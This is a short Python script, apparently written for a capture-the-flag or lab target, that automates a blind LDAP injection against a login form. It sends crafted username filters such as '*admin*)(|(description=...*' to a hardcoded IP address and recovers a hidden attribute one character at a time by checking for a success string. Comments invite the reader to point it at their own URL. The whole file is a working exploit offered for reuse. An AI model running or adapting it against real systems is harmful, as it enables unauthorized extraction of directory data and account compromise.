import requests

from string import ascii_letters, digits, printable

# short basic script to bruteforce a blind LDAP injection 


CONTAINS_TEXT = "Login successful " # change this to whatever differentiates a successful injection from a failed one
URL = "http://83.136.252.214:33857/index.php" # change to your url
CHARACTERS = ascii_letters + digits + "{}_"

def bruteforce_value():
    value = ""
    while True: 
        for c in printable:
            current_value = value + c
            print(f"Trying {current_value}")
            data = {"username": f"*admin*)(|(description={current_value}*", "password":"indvalid)" } # change to your data
            r = requests.post(URL, data) #change to your url

            contents = r.text

            if CONTAINS_TEXT in contents:
                value += c
                break

    return value            

if __name__ == "__main__":
    print(bruteforce_value())
